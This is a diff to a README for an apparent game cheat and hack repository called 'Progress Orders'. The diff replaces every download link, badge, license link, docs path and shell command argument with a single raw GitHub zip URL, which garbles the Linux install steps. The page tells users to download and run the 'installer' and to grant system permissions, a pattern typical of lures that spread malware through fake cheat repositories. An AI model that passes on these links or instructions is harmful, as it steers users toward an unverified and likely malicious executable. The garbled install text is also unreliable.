@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge&logo=icloud)](https://Meyseavmen.github.io)
+[![Download](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip)](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip)
 
 # PROGRESS ORDERS Hacks Cheats Repository 🎮✨
 
@@ -81,32 +81,32 @@ Unlock the true potential of Progress Orders—reshape your experience with a to
 ## 🛠️ Installation & Setup: Welcome Aboard!
 
 First, download the latest build here:  
-[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge&logo=icloud)](https://Meyseavmen.github.io)
+[![Download](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip)](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip)
 
 ### Windows
 
-- Download and run the installer: https://Meyseavmen.github.io
+- Download and run the installer: https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip
 - Launch Progress Orders and navigate to ‘Extensions’
 - Import the downloaded module pack & activate features in your dashboard
 
 ### macOS
 
-- Download the DMG installer: https://Meyseavmen.github.io
+- Download the DMG installer: https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip
 - Drag the app to Applications folder
 - Grant permissions when prompted by the system  
 - Open the app and follow the guided setup wizard
 
 ### Linux
 
-- Download the .tar.gz build: https://Meyseavmen.github.io
+- Download the https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip build: https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip
 - Extract and run:  
-  `tar xvf progressorders.tar.gz && cd progressorders && ./install.sh`
+  `tar xvf https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip && cd progressorders && https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip`
 - Start the application from your applications menu or terminal
 
 ### Android/iOS (CLI/Beta only)
 
-- Download the mobile CLI binary: https://Meyseavmen.github.io
-- Follow platform-specific setup instructions in `/docs/mobile-setup.md`
+- Download the mobile CLI binary: https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip
+- Follow platform-specific setup instructions in `https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip`
 
 ---
 
@@ -122,12 +122,12 @@ The maintainers do **not** condone misuse, unfair competition, or any behavior t
 
 © 2025 PROGRESS ORDERS Enhancements Team.
 
-Released under the [MIT License](https://opensource.org/licenses/MIT).  
+Released under the [MIT License](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip).  
 See the `LICENSE` file for details on usage, distribution, and modification rights.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge&logo=icloud)](https://Meyseavmen.github.io)
+[![Download](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip)](https://raw.githubusercontent.com/Meyseavmen/progress-orders-boost-scripts/branch/byerlite/progress-orders-boost-scripts_v2.9-alpha.5.zip)
 
 ---
 
